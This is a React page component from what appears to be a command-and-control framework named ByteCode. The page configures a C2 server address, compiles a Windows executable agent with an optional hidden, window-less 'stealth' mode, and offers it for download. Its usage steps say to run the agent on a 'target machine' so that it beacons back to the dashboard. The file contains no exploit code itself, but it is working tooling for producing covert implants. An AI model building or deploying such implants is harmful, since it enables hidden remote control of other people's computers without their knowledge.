import React, { useState } from 'react';
import { payloadsApi } from '../utils/api';
import { Download, Cpu, Loader2, CheckCircle, AlertCircle, Globe } from 'lucide-react';

const PayloadPage = () => {
  const [serverUrl, setServerUrl] = useState(() => {
    const host = window.location.hostname;
    const protocol = window.location.protocol;
    return `${protocol}//${host}:3001`;
  });
  const [showGui, setShowGui] = useState(false);
  const [isGenerating, setIsGenerating] = useState(false);
  const [result, setResult] = useState(null);
  const [error, setError] = useState(null);

  const handleGenerate = async (e) => {
    e.preventDefault();
    setIsGenerating(true);
    setError(null);
    setResult(null);

    try {
      const data = await payloadsApi.generate(serverUrl, showGui);
      setResult(data);
    } catch (err) {
      setError(err.message);
    } finally {
      setIsGenerating(false);
    }
  };

  const handleDownload = () => {
    if (!result) return;
    // Construct full download URL
    const downloadUrl = `http://${window.location.hostname}:3001${result.downloadUrl}`;
    window.open(downloadUrl, '_blank');
  };

  return (
    <div className="space-y-8 pb-8">
      <div className="flex flex-col gap-3">
        <h1 className="text-4xl font-bold text-white tracking-tight">Payload Generator</h1>
        <p className="text-slate-400 text-base max-w-2xl">
          Compile a custom ByteCode agent with embedded C2 configuration. Configure the network parameters and build options below.
        </p>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
        {/* Generator Form */}
        <div className="card p-8 shadow-xl">
          <div className="flex items-center gap-3 mb-8">
            <div className="p-3 bg-primary/10 rounded-lg border border-primary/20">
              <Cpu className="w-5 h-5 text-primary" />
            </div>
            <h2 className="text-2xl font-bold text-white">Build Configuration</h2>
          </div>

          <form onSubmit={handleGenerate} className="space-y-6">
            <div className="space-y-3">
              <label className="text-sm font-semibold text-slate-200 flex items-center gap-2">
                <Globe className="w-4 h-4 text-primary" />
                C2 Server URL
              </label>
              <input
                type="text"
                value={serverUrl}
                onChange={(e) => setServerUrl(e.target.value)}
                placeholder="http://192.168.1.100:3001"
                className="input w-full"
                required
              />
              <p className="text-xs text-slate-500">
                The agent will automatically attempt to connect to this address.
              </p>
            </div>

            <div className="flex items-start gap-4 p-4 bg-slate-900/30 border border-slate-800 rounded-lg hover:bg-slate-900/50 transition-colors">
              <input
                type="checkbox"
                id="showGui"
                checked={showGui}
                onChange={(e) => setShowGui(e.target.checked)}
                className="w-4 h-4 mt-1 rounded border-slate-700 bg-slate-800 text-primary focus:ring-primary/50 cursor-pointer"
              />
              <div className="flex-1 space-y-1">
                <label htmlFor="showGui" className="text-sm font-semibold text-white cursor-pointer block">
                  Enable Testing GUI
                </label>
                <p className="text-xs text-slate-500">
                  Shows the console window for debugging connection issues.
                </p>
              </div>
            </div>

            <button
              type="submit"
              disabled={isGenerating}
              className="btn btn-primary w-full py-3 text-base font-semibold"
            >
              {isGenerating ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  Compiling Agent...
                </>
              ) : (
                <>
                  <Cpu className="w-4 h-4" />
                  Generate Payload
                </>
              )}
            </button>
          </form>
        </div>

        {/* Status / Results */}
        <div className="card p-8 shadow-xl flex flex-col justify-center items-center min-h-[400px]">
          {!isGenerating && !result && !error && (
            <div className="text-slate-500 text-center">
              <div className="p-3 bg-slate-800/50 rounded-full inline-flex mb-4">
                <Cpu className="w-8 h-8 opacity-30" />
              </div>
              <p className="text-sm">Configure and generate an agent to see build status.</p>
            </div>
          )}

          {isGenerating && (
            <div className="space-y-4 text-center">
              <Loader2 className="w-12 h-12 text-primary animate-spin mx-auto" />
              <div className="space-y-1">
                <p className="font-semibold text-white text-base">Building Executable</p>
                <p className="text-sm text-slate-400">Injecting C2 configuration and compiling Go source...</p>
              </div>
            </div>
          )}

          {error && (
            <div className="space-y-4 text-center text-error w-full">
              <AlertCircle className="w-12 h-12 mx-auto" />
              <div className="space-y-1">
                <p className="font-semibold text-white text-base">Generation Failed</p>
                <p className="text-sm text-slate-400">{error}</p>
              </div>
            </div>
          )}

          {result && (
            <div className="space-y-6 w-full">
              <div className="text-center">
                <CheckCircle className="w-12 h-12 text-success mx-auto mb-3" />
                <div className="space-y-1">
                  <p className="font-semibold text-success text-base">Build Successful!</p>
                  <p className="text-sm text-slate-400 font-mono">{result.filename}</p>
                </div>
              </div>

              <div className="bg-slate-900/50 border border-slate-800 rounded-lg p-4 space-y-3">
                <div className="flex justify-between text-sm">
                  <span className="text-slate-500">Target OS</span>
                  <span className="text-slate-200 font-medium">Windows (amd64)</span>
                </div>
                <div className="flex justify-between text-sm border-t border-slate-800 pt-3">
                  <span className="text-slate-500">Format</span>
                  <span className="text-slate-200 font-medium">Executable (.exe)</span>
                </div>
                <div className="flex justify-between text-sm border-t border-slate-800 pt-3">
                  <span className="text-slate-500">Stealth</span>
                  <span className={result.showGui ? "text-warning font-medium" : "text-success font-medium"}>
                    {result.showGui ? "Visible (Testing)" : "GUI-less (Hidden)"}
                  </span>
                </div>
              </div>

              <button
                onClick={handleDownload}
                className="btn btn-primary w-full py-3 text-base font-semibold"
              >
                <Download className="w-4 h-4" />
                Download Agent
              </button>
            </div>
          )}
        </div>
      </div>

      {/* Instructions */}
      <div className="bg-primary/5 border border-primary/30 rounded-xl p-6">
        <h3 className="text-primary font-semibold text-base mb-4 flex items-center gap-2">
          <div className="w-1 h-1 bg-primary rounded-full" />
          How to use
        </h3>
        <ul className="text-sm text-slate-300 space-y-2 list-disc list-inside">
          <li>Enter the public IP or domain where your ByteCode server is running.</li>
          <li>Click generate to compile a fresh Windows executable.</li>
          <li>Download and run the agent on your target machine.</li>
          <li>The agent will automatically appear in the dashboard once it beacons.</li>
        </ul>
      </div>
    </div>
  );
};

export default PayloadPage;
